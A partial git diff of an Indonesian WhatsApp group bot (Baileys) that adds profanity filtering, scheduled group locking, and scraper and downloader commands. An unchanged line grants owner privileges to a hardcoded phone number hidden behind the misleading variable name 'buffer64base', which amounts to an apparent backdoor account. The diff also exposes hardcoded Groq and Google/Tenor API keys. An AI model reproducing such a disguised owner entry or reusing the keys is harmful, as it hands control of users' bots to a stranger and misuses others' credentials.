@@ -14,15 +14,21 @@ const moment = require("moment-timezone");
 const nou = require("node-os-utils");
 const cheerio = require('cheerio');
 const FormData = require("form-data");
+const cron = require('node-cron')
 const os = require('os');
+const didyoumean = require('didyoumean');
+const similarity = require('similarity');
 const googleTTS = require('google-tts-api');
-const { say } = require("cfonts")
+const { say } = require("cfonts");
 const pino = require('pino');
 const fetch = require('node-fetch');
 const crypto = require('crypto');
 const { exec, spawn, execSync } = require('child_process');
-const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');
+const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, S_WHATSAPP_NET } = require('@whiskeysockets/baileys')
 
+
+const salamm = fs.readFileSync("./src/mp3/salam.mp3")
+const groupId = '120363357804717883@g.us';
 const prem = require("./lib/premium");
 const config = require("./settings.js");
 const Func = require("./lib/function");
@@ -31,7 +37,7 @@ const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
 const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
 const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
 const list = JSON.parse(fs.readFileSync("./database/list.json"))
-const { pinterest, pinterest2, remini, tiktokDl } = require('./lib/scraper')
+const { pinterest, pinterest2, remini, rmbg, tiktokDl } = require('./lib/scraper')
 const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/function');
 
 
@@ -42,20 +48,21 @@ const { type, quotedMsg } = m
 const from = m.key.remoteJid
 const botNumber = await xyu.decodeJid(xyu.user.id)
 const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
-const budy = (typeof m.text == 'string' ? m.text : '')
 const buffer64base = "6283176305101@s.whatsapp.net";
-const prefix = "."
-const isCmd = body.startsWith(prefix) ? true : false
+var budy = (typeof m.text == 'string' ? m.text : '')
+var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
+const isCmd = body.startsWith(prefix)
+const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
 const args = body.trim().split(/ +/).slice(1)
 const getQuoted = (m.quoted || m)
 const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
-const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
 const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
 const isPremium = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
 const sender = m.key.fromMe ? (xyu.user.id.split(':')[0]+'@s.whatsapp.net' || xyu.user.id) : (m.key.participant || m.key.remoteJid)
 const senderNumber = sender.split('@')[0]
 const pushname = m.pushName || `${senderNumber}`
 const text = q = args.join(' ')
+const qtod = m.quoted? "true":"false"
 const mime = (quoted.msg || quoted).mimetype || ''
 const qmsg = (quoted.msg || quoted)
 const isMedia = /image|video|sticker|audio/.test(mime)
@@ -66,6 +73,14 @@ const isGroup = m.key.remoteJid.endsWith('@g.us')
 const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
 const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
 const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
+const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
+const nomore = m.sender.replace(/[^0-9]/g, '')
+
+const more = String.fromCharCode(8206)
+const readmore = more.repeat(4001)
+const mentss = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
+const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
+
 try {
 ppuser = await xyu.profilePictureUrl(m.sender, 'image')
 } catch (err) {
@@ -73,6 +88,30 @@ ppuser = 'https://files.catbox.moe/0arg0u.jpg'
 }
 ppnyauser = await getBuffer(ppuser)
 
+const ytime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
+const ydate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
+const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
+if(time2 < "23:59:00"){
+var waktuucapan = 'Selamat Malam 🌃'
+}
+if(time2 < "19:00:00"){
+var waktuucapan = 'Selamat Petang 🌆'
+}
+if(time2 < "18:00:00"){
+var waktuucapan = 'Selamat Sore 🌅'
+}
+if(time2 < "15:00:00"){
+var waktuucapan = 'Selamat Siang 🏙'
+}
+if(time2 < "10:00:00"){
+var waktuucapan = 'Selamat Pagi 🌄'
+}
+if(time2 < "05:00:00"){
+var waktuucapan = 'Selamat Subuh 🌉'
+}
+if(time2 < "03:00:00"){
+var waktuucapan = 'Tengah Malam 🌌'
+}
 //============== [ MESSAGE ] ================================================
 if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return
 
@@ -132,6 +171,7 @@ await sleep(duh)
 await xyu.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
 }}
 
+const users = global.db.users
 
 const reSize = async(buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
@@ -179,6 +219,55 @@ await sleep(1000)
 await xyu.groupParticipantsUpdate(m.chat, [m.sender], "remove")
 }}
 
+if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].antitoxic === true) {
+    const toxicWords = /\b(anj|Anj|anjing|Anjing|tol|Tol|tolol|Tolol|kon|Kon|kontol|Kontol|bajingan|Bajingan|babi|Babi|goblok|Goblok|idiot|Idiot|sialan|Sialan|kontolan|Kontolan|brengsek|Brengsek|jancok|Jancok|asu|Asu|setan|Setan|bangsat|Bangsat|bacot|Bacot|perek|Perek|pler|Pler|gblk|Gblk|ajg|Ajg|memek|Memek|puki|Puki|ngtd|Ngtd|bokep|Bokep|bokp|Bokp|fuck|Fuck|ngentot|Ngentot|lonte|Lonte|kimak|Kimak|pantek|Pantek|pukimak|Pukimak|pepek|Pepek|coli|Coli|ewe|Ewe|bejat|Bejat|kampang|Kampang|telek|Telek|bacod|Bacod|tai|Tai|monyet|Monyet|Bego|bego)\b/i;
+
+    // Jika pesan mengandung kata toxic
+    if (toxicWords.test(m.text)) {
+        // Jika pengirim adalah admin atau kreator, jangan hapus
+        if (m.isAdmin || isCreator) {
+            await xyu.sendMessage(
+                m.chat, 
+                {
+                    text: `Atmin mah gpp toxic😹`, 
+                    contextInfo: { mentionedJid: [m.sender] }
+                }
+            );
+            return;
+        }
+
+        // Kirim balasan dalam bentuk pesan suara
+        await xyu.sendMessage(
+            m.chat, 
+            {
+                audio: fs.readFileSync('./src/mp3/toxic.mp3'), 
+                mimetype: 'audio/mpeg', 
+                ptt: true
+            }, 
+            { quoted: m }
+        );
+
+        // Hapus pesan toxic
+        await xyu.sendMessage(m.chat, {
+            delete: {
+                remoteJid: m.chat,
+                fromMe: false,
+                id: m.key.id,
+                participant: m.key.participant
+            }
+        });
+    }
+}
+
+if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].antibot === true) {
+    if (m.isBaileys && m.fromMe == false){
+        if (isAdmins || !m.isBotAdmin){		  
+        } else {
+          replygcyuta(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
+    return await xyu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+        }
+    }
+   }
 
 if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
 var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
@@ -204,7 +293,18 @@ await m.reply(check.respon)
 }
 }
 
+
 //============= [ FUNCTION ] ======================================================
+
+async function pepe(media) {
+    const jimpImage = await jimp.read(media);
+    const min = Math.min(jimpImage.getWidth(), jimpImage.getHeight());
+    const cropped = jimpImage.crop(0, 0, min, min);
+    return {
+        img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp.MIME_JPEG),
+        preview: await cropped.normalize().getBufferAsync(jimp.MIME_JPEG),
+    };
+}
 
 async function sendButton(jid, teks1) {
 let msg = generateWAMessageFromContent(jid, {
@@ -259,110 +359,13 @@ await xyu.relayMessage(m.chat, msg.message, {
 messageId: msg.key.id
 })
 }
-
-async function tiktokDl(url) {
-	return new Promise(async (resolve, reject) => {
-		try {
-			let data = []
-			function formatNumber(integer) {
-				let numb = parseInt(integer)
-				return Number(numb).toLocaleString().replace(/,/g, '.')
-			}
-			
-			function formatDate(n, locale = 'en') {
-				let d = new Date(n)
-				return d.toLocaleDateString(locale, {
-					weekday: 'long',
-					day: 'numeric',
-					month: 'long',
-					year: 'numeric',
-					hour: 'numeric',
-					minute: 'numeric',
-					second: 'numeric'
-				})
-			}
-			
-			let domain = 'https://www.tikwm.com/api/';
-			let res = await (await axios.post(domain, {}, {
-				headers: {
-					'Accept': 'application/json, text/javascript, */*; q=0.01',
-					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-					'Origin': 'https://www.tikwm.com',
-					'Referer': 'https://www.tikwm.com/',
-					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
-					'Sec-Ch-Ua-Mobile': '?1',
-					'Sec-Ch-Ua-Platform': 'Android',
-					'Sec-Fetch-Dest': 'empty',
-					'Sec-Fetch-Mode': 'cors',
-					'Sec-Fetch-Site': 'same-origin',
-					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-					'X-Requested-With': 'XMLHttpRequest'
-				},
-				params: {
-					url: url,
-					count: 12,
-					cursor: 0,
-					web: 1,
-					hd: 1
-				}
-			})).data.data
-			if (res && !res.size && !res.wm_size && !res.hd_size) {
-				res.images.map(v => {
-					data.push({ type: 'photo', url: v })
-				})
-			} else {
-				if (res && res.wmplay) {
-					data.push({ type: 'watermark', url: 'https://www.tikwm.com' + res.wmplay })
-				}
-				if (res && res.play) {
-					data.push({ type: 'nowatermark', url: 'https://www.tikwm.com' + res.play })
-				}
-				if (res && res.hdplay) {
-					data.push({ type: 'nowatermark_hd', url: 'https://www.tikwm.com' + res.hdplay })
-				}
-			}
-			let json = {
-				status: true,
-				title: res.title,
-				taken_at: formatDate(res.create_time).replace('1970', ''),
-				region: res.region,
-				id: res.id,
-				durations: res.duration,
-				duration: res.duration + ' Seconds',
-				cover: 'https://www.tikwm.com' + res.cover,
-				size_wm: res.wm_size,
-				size_nowm: res.size,
-				size_nowm_hd: res.hd_size,
-				data: data,
-				music_info: {
-					id: res.music_info.id,
-					title: res.music_info.title,
-					author: res.music_info.author,
-					album: res.music_info.album ? res.music_info.album : null,
-					url: 'https://www.tikwm.com' + res.music || res.music_info.play
-				},
-				stats: {
-					views: formatNumber(res.play_count),
-					likes: formatNumber(res.digg_count),
-					comment: formatNumber(res.comment_count),
-					share: formatNumber(res.share_count),
-					download: formatNumber(res.download_count)
-				},
-				author: {
-					id: res.author.id,
-					fullname: res.author.unique_id,
-					nickname: res.author.nickname,
-					avatar: 'https://www.tikwm.com' + res.author.avatar
-				}
-			}
-			resolve(json)
-		} catch (e) {
-			reject(e)
-		}
-	});
+function pickRandom(list) {
+return list[Math.floor(Math.random() * list.length)]
 }
 
+function monospace(string) {
+return '```' + string + '```'
+}
 
 async function uploadToCatbox(filePath) {
             const form = new FormData();
@@ -576,7 +579,7 @@ return plugins
 //========= [ COMMANDS PLUGINS ] =================================================
 let pluginsDisable = true;
 const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"));
-const xyuradev = { xyu, toIDR, Func, sendButton, isCreator, reply, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, args, sleep, botNumber };
+const xyuradev = { xyu, toIDR, pushname, Func, sendButton, isCreator, reply, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, args, sleep, botNumber };
 
 for (let plugin of plugins) {
   // don delete may we em 😂
@@ -610,22 +613,14 @@ await xyu.sendMessage(m.chat, {text: aurelmaxyu[i], edit: key });//PESAN LEPAS
 }
 
 if (command && !isGroup && !isCreator && !isPremium) {
-    return reply("Bot hanya dapat digunakan di grup. Silakan bergabung ke grup ini: https://chat.whatsapp.com/KVbM5D5cTMt0jcXNnUqflR");
+    return reply(`Haii kak ${pushname} maaf chat bot private hanya berlaku untuk user premium, jadi silakan bergabung ke grup ini untuk menggunakan bot: https://chat.whatsapp.com/KVbM5D5cTMt0jcXNnUqflR`);
 }
 if (!xyu.public) {
 if (!isOwner && !m.key.fromMe) return
         }
 
-if (global.autodonlod && !m.key.fromMe)
-if (budy.match(`tiktok.com`)){
-reply('memuat..')
-await tiktokDl(budy).then(async resi => {
-let taev = `Title : ${resi.title}
-Author : ${resi.author}`
-await xyu.sendMessage(from, {audio: {url: resi.audio}, mimetype: 'audio/mpeg', ptt: false})
-await xyu.sendMessage(from, {video: {url: resi.nowm}, caption: taev})
-}).catch((err) => reply('Maaf erjadi Kesalahan!')) // pengalih isu
-}
+
+
 //============= [ GAME ] ====================================================
 	    
 
@@ -644,14 +639,274 @@ let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quot
 			user.afkTime = -1
 			user.afkReason = ''
 		}
-	
-        
-        //game
+		
+
+
+// Tutup grup pada pukul 18:00
+cron.schedule('0 0 18 * * *', async () => {
+    const groupMetadata = await xyu.groupMetadata(groupId);
+
+    if (!groupMetadata.announce) {
+        let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis';
+        await xyu.groupSettingUpdate(groupId, 'announcement');
+        await xyu.sendMessage(groupId, { text: '*[ System Notice ]* Segeralah Beribadah...' });
+        await xyu.sendMessage(groupId, { text: text }, { ephemeralExpiration: 0 });
+    }
+}, { scheduled: true, timezone: 'Asia/Jakarta' });
+
+// Buka grup pada pukul 19:00
+cron.schedule('0 0 19 * * *', async () => {
+    const groupMetadata = await xyu.groupMetadata(groupId);
+
+    if (groupMetadata.announce) {
+        let text = '*[ System Notice ]* Waktu maghrib usai, group dibuka kembali.';
+        await xyu.groupSettingUpdate(groupId, 'not_announcement');
+        await xyu.sendMessage(groupId, {
+            text: text,
+            mentions: Object.values(global.db.groups[groupId].member).map(v => v.id)
+        }, { ephemeralExpiration: 0 });
+
+        const data = await xyu.groupRequestParticipantsList(groupId);
+        if (data.length > 0) {
+            for (let participant of data) {
+                await xyu.groupRequestParticipantsUpdate(groupId, [participant.jid], 'approve');
+                await delay(1000);
+            }
+        }
+    }
+}, { scheduled: true, timezone: 'Asia/Jakarta' });
+
+// Tutup grup pada pukul 22:00
+cron.schedule('0 0 22 * * *', async () => {
+    const groupMetadata = await xyu.groupMetadata(groupId);
+    if (!groupMetadata.announce) {
+        let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis';
+        await xyu.groupSettingUpdate(groupId, 'announcement');
+        await xyu.sendMessage(groupId, { text: text }, { ephemeralExpiration: 0 });
+    }
+}, { scheduled: true, timezone: 'Asia/Jakarta' });
+
+// Buka grup pada pukul 06:00
+cron.schedule('0 0 6 * * *', async () => {
+    const groupMetadata = await xyu.groupMetadata(groupId);
+    if (groupMetadata.announce) {
+        let text = '*[ System Notice ]* Sistem secara otomatis membuka grup ini karena pagi hari.';
+        await xyu.groupSettingUpdate(groupId, 'not_announcement');
+        await xyu.sendMessage(groupId, {
+            text: text,
+            mentions: Object.values(global.db.groups[groupId].member).map(v => v.id)
+        }, { ephemeralExpiration: 0 });
+
+        const data = await xyu.groupRequestParticipantsList(groupId);
+        if (data.length > 0) {
+            for (let participant of data) {
+                await xyu.groupRequestParticipantsUpdate(groupId, [participant.jid], 'approve');
+                await delay(1000);
+            }
+        }
+    }
+}, { scheduled: true, timezone: 'Asia/Jakarta' });
+
+
+if (body.match(`@${global.owner.split('@')[0]}`)) {
+      m.reply('*Iyaa kenapa tag ownerku?*')
+}
+/*
+
+if (budy.includes('@6285640230683')) {
+  const q = budy.replace('@6285640230683', '').trim();
+  if (q) {
+try {
+const Groq = require("groq-sdk");
+const groq = new Groq({ apiKey: "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" });
+async function main(teks) {
+  const completion = await groq.chat.completions
+    .create({
+      messages: [
+        {
+          role: "user",
+          content: teks
+        },
+      ],
+      model: "mixtral-8x7b-32768",
+    })
+    .then((chatCompletion) => {
+      m.reply(chatCompletion.choices[0]?.message?.content || "");
+    });
+}
+return main(text);
+    } catch (error) {
+      m.reply("aku gapapa kok.");
+    }
+  } else {
+    m.reply("apasiii kamu??");
+  }
+}*/
 
 //===============================================================================
 
 
 switch (command) {
+
+case 'bukalapak':{
+//wm senn
+async function BukaLapak(search) {
+  return new Promise(async (resolve, reject) => {
+    try {
+      const { data } = await axios.get(`https://www.bukalapak.com/products?from=omnisearch&from_keyword_history=false&search[keywords]=${search}&search_source=omnisearch_keyword&source=navbar`, {
+        headers: {
+          "user-agent": 'Mozilla/ 5.0(Windows NT 10.0; Win64; x64; rv: 108.0) Gecko / 20100101 Firefox / 108.0'
+        }
+      })
+//wm senn
+      const $ = cheerio.load(data);
+      const dat = [];
+      const b = $('a.slide > img').attr('src');
+      $('div.bl-flex-item.mb-8').each((i, u) => {
+        const a = $(u).find('observer-tracker > div > div');
+//wm senn
+        const img = $(a).find('div > a > img').attr('src');
+        if (typeof img === 'undefined') return
+
+        const link = $(a).find('.bl-thumbnail--slider > div > a').attr('href');
+//wm senn
+        const title = $(a).find('.bl-product-card__description-name > p > a').text().trim();
+        const harga = $(a).find('div.bl-product-card__description-price > p').text().trim();
+//wm senn
+        const rating = $(a).find('div.bl-product-card__description-rating > p').text().trim();
+        const terjual = $(a).find('div.bl-product-card__description-rating-and-sold > p').text().trim();
+//wm senn
+//wm senn
+        const dari = $(a).find('div.bl-product-card__description-store > span:nth-child(1)').text().trim();
+        const seller = $(a).find('div.bl-product-card__description-store > span > a').text().trim();
+//wm senn 
+        const link_sel = $(a).find('div.bl-product-card__description-store > span > a').attr('href');
+//wm senn
+//wm senn 
+        const res_ = {
+          title: title,
+          rating: rating ? rating : 'No rating yet',
+          terjual: terjual ? terjual : 'Not yet bought',
+          harga: harga,
+          image: img,
+          link: link,
+          store: {
+            lokasi: dari,
+            nama: seller,
+            link: link_sel
+          }
+        };
+
+        dat.push(res_);
+      })
+//wm senn
+      if (dat.every(x => x === undefined)) return resolve({ developer: '@xorizn', mess: 'no result found' })
+      resolve(dat)
+    } catch (err) {
+//wm senn
+      console.error(err)
+    }
+  })
+}
+//wm senn
+if (!text) return m.reply('```Masukan nama item yang ingin di cari!!\n```')
+m.reply(mess.wait)
+let results = await BukaLapak(text)
+//wm senn
+if (results.length > 0) {
+let message = `Hasil pencarian untuk <${text}>\n\n`;
+//wm senn
+results.forEach((result, index) => {
+message += `*${index + 1}.* *${result.title}*\nHarga : ${result.harga}\nRating : ${result.rating}\nStore : ${result.store.nama}\nLokasi : ${result.store.lokasi}\nTerjual : ${result.terjual}\nLink : ${result.link}\n\n`;
+ });
+//wm senn
+xyu.sendMessage(m.chat, { image: { url: results[0].image}, caption: message }, { quoted: m })
+//wm senn
+ } else {
+m.reply('Nama item yang anda berikan tidak ada.');
+}
+//wm senn
+}
+break
+case 'videy': case 'videydl':{
+    if (!text) return m.reply("mana linknya?");
+    
+    await xyu.sendMessage(m.chat, { react: { text: "🕐", key: m.key } });
+    
+    var anu = text.replace("v?id=", "");
+    var dompResult = anu.replace("https://", "https://cdn.");
+    
+    xyu.sendMessage(m.chat, { 
+        video: { url: dompResult + ".mp4" }, 
+        caption: '```Success...\nDont forget to donate```' 
+    }, { quoted: qchanel });
+    
+}
+break
+case 'emojimix': {
+		let [emoji1, emoji2] = text.split`+`
+		if (!emoji1) return reply(`Example : ${prefix + command} 😅+🤔`)
+		if (!emoji2) return reply(`Example : ${prefix + command} 😅+🤔`)
+		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
+		for (let res of anumojimix.results) {
+		    let encmedia = await xyu.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
+		    
+		}
+	    }
+	    break
+
+case "script": 
+case "sc":
+    xyu.relayMessage(m.chat, {
+        "requestPaymentMessage": {
+            amount: { 
+                value: 2022000,
+                offset: 0,
+                currencyCode: 'IDR'
+            },
+            amount1000: 55000000,
+            background: null,
+            currencyCodeIso4217: 'USD',
+            expiryTimestamp: 0,
+            noteMessage: {
+                extendedTextMessage: {
+                    text: `
+Hay Kak ${pushname} 👋
+${waktuucapan}
+
+Script nya di bawah ini ya ⬇️ :
+https://github.com/Xyuraa/Takashi-Botz.git
+
+> jangan lupa kasih bintang ya!! 
+•-------------------------------------------------•`
+                }
+            },
+            requestFrom: m.sender
+        }
+    }, 
+    {});
+
+    // Mengirimkan audio setelah mengirimkan pesan
+    xyu.sendMessage(m.chat, {
+        audio: fs.readFileSync('./src/mp3/script.mp3'), 
+        mimetype: 'audio/mpeg', 
+        ptt: true
+    }, {quoted: m});
+break;
+
+case 'snobg': {
+if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
+if (/image/.test(mime)) {
+let media = await xyu.downloadAndSaveMediaMessage(quoted)
+let encmedia = await xyu.sendImageAsSticker(m.chat, await rmbg(media), verif, { packname: global.packname, author: global.author })
+await fs.unlinkSync(encmedia)
+} else {
+reply(`Send/Reply Images With Captions ${prefix+command}`)
+}
+}
+break
+
+/*
 case 'ttimg':
 case 'ttslide':
 case 'tiktokslide': {
@@ -676,9 +931,10 @@ case 'tiktokslide': {
     await xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 }
 break
+*/
+
 
 case 'takashi': {
-if (!isPremium) return reply(mess.prem)
     if (!q) return m.reply(`*Nanya Apa?*`);
 
     if (/image|gambar/.test(mime)) {
@@ -708,7 +964,6 @@ if (!isPremium) return reply(mess.prem)
         }
     }
     else if (/brat/.test(q)) { // Integrasi dari 'brat2'
-        if (!isPremium) return reply(mess.prem);
         const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
         if (!quo) return m.reply("Masukan teksnya woii");
 
@@ -777,27 +1032,6 @@ case 'texttospech': case 'tts': case 'tospech': {
 			}
 			break
 
-case 'ytmp3': {
-  const url = args[0];
-  if (!url) return reply("Masukkan URL untuk mengunduh audio!");
-  try {
-    // Panggil API untuk mengunduh audio
-    const response = await axios.get(`https://axeel.my.id/api/download/audio`, {
-      params: { url },
-      responseType: 'arraybuffer', // Karena API mengembalikan data audio
-    });
-
-    // Konversi respons menjadi buffer
-    const audioBuffer = Buffer.from(response.data);
-
-    // Kirim audio ke pengguna
-    await xyu.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
-  } catch (error) {
-    console.error("Kesalahan API:", error.response ? error.response.data : error.message);
-    reply("Terjadi kesalahan saat memproses permintaan. Pastikan URL valid atau coba lagi nanti.");
-  }
-}
-break;
 
 
 
@@ -1137,20 +1371,25 @@ let yts = require("yt-search")
 break
 //===============================================================================
 
-case 'ig': case 'instagram': {
-        if (!q) return m.reply(`Anda perlu memberikan URL video atau reel.`);
-        try {
-                const { igdl } = require('btch-downloader');
-                const data = await igdl(text);
-                if (!data || data.length === 0) return m.reply(`Tidak ada video atau gambar ditemukan.`);
-                const mediaURL = data[0].url;
-                await xyu.sendMessage(m.chat, { video: { url: mediaURL } }, { quoted: m });
-        } catch (error) {
-                return m.reply(`Terjadi kesalahan: ${error.message}`);
-        }
-}
+case "instagram": case "igdl": case "ig": {
+if (!text) return m.reply(example("linknya"))
+if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
+await xyu.sendMessage(m.chat, { react: { text: '🕖', key: m.key } })
+await fetchJson(`https://api.tioo.eu.org/download/igdl?url=${text}`).then(async (res) => {
+          if (!res.status) return m.reply("Error! Result Not Found")
+          await xyu.sendMessage(m.chat, { video: { url: res.result[0].url }, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*" }, { quoted: m })
+          await xyu.sendMessage(m.chat, { react: { text: '', key: m.key } })
+}).catch((e) => m.reply("Error! Result Not Found"))
+      }
 break
-
+//=================================================//
+case "fasebook":
+case "fb":{
+if (!text) return m.reply("Mana URL-nya?");
+const { data } = await axios.post("https://allvideodownloader.cc/wp-json/aio-dl/video-data/", { url: text });
+await xyu.sendMessage(m?.chat, { video: { url: data.medias[0].url }, caption: "done", fileName: `tiktok.mp4`, mimetype: 'video/mp4' })
+}
+break;
 //================================================================================
 case 'bard': {
   if (!text) {
@@ -1587,6 +1826,64 @@ case 'setppbot': {
 				}
 			}
 			break
+			
+			
+			case 'setpppanjang': {
+    if (!isCreator) return m.reply(mess.owner);
+    if (!/image/.test(mime)) 
+        return m.reply(`Reply Image Dengan Caption ${prefix + command}`);
+    
+    let media;
+    try {
+        media = await xyu.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg');
+    } catch (error) {
+        console.error('Error saat download media:', error);
+        return m.reply('Gagal mendownload media. Coba lagi, ya!');
+    }
+    
+    async function processProfilePicture(media) {
+        try {
+            const jimp1 = await jimp.read(media);
+            const min = jimp1.getWidth();
+            const max = jimp1.getHeight();
+            const cropped = jimp1.crop(0, 0, min, max);
+            return {
+                img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp.MIME_JPEG),
+                preview: await cropped.normalize().getBufferAsync(jimp.MIME_JPEG),
+            };
+        } catch (error) {
+            console.error('Error saat memproses gambar:', error);
+            throw new Error('Gagal memproses gambar.');
+        }
+    }
+    
+    try {
+        let { img } = await processProfilePicture(media);
+        
+        await xyu.query({
+            tag: 'iq',
+            attrs: {
+                to: S_WHATSAPP_NET,
+                type: 'set',
+                xmlns: 'w:profile:picture'
+            },
+            content: [
+                { 
+                    tag: 'picture', 
+                    attrs: { type: 'image' }, 
+                    content: img 
+                }
+            ]
+        });
+        
+        await fs.unlinkSync(media);
+        m.reply('Sukses');
+    } catch (error) {
+        console.error('Error saat mengupdate profile picture:', error);
+        m.reply('Gagal mengupdate profile picture. Cek log untuk detailnya.');
+    }
+}
+break;
 //================================================================================
 
 
@@ -1769,49 +2066,75 @@ break
 
 //================================================================================
 
-case 'cekkhodam': 
-case 'cekkodam':
-    if (!text) return reply('Nama nya?');
-    function pickRandom(list) {
-        return list[Math.floor(Math.random() * list.length)];
-    }
-    // Daftar nama khodam acak
-    const ceknyaa = pickRandom([
-        "Kaleng Cat Avian", "Pipa Rucika", "Botol Tupperware", "Badut Mixue", 
-        "Sabun GIV", "Sandal Swallow", "Jarjit", "Ijat", "Fizi", "Mail", "Ehsan", 
-        "Upin", "Ipin", "Sungut Lele", "Tok Dalang", "Opah", "Opet", "Alul", 
-        "Pak Vinsen", "Maman Resing", "Pak RT", "Admin ETI", "Bung Towel", 
-        "Lumpia Basah", "Martabak Manis", "Baso Tahu", "Tahu Gejrot", "Dimsum", 
-        "Seblak Ceker", "Telor Gulung", "Tahu Aci", "Tempe Mendoan", "Nasi Kucing", 
-        "Kue Cubit", "Tahu Sumedang", "Nasi Uduk", "Wedang Ronde", "Kerupuk Udang", 
-        "Cilok", "Cilung", "Kue Sus", "Jasuke", "Seblak Makaroni", "Sate Padang", 
-        "Sayur Asem", "Kromboloni", "Marmut Pink", "Belalang Mullet", "Kucing Oren", 
-        "Lintah Terbang", "Singa Paddle Pop", "Macan Cisewu", "Vario Mber", 
-        "Beat Mber", "Supra Geter", "Oli Samping", "Knalpot Racing", "Jus Stroberi", 
-        "Jus Alpukat", "Alpukat Kocok", "Es Kopyor", "Es Jeruk", "Cappucino Cincau", 
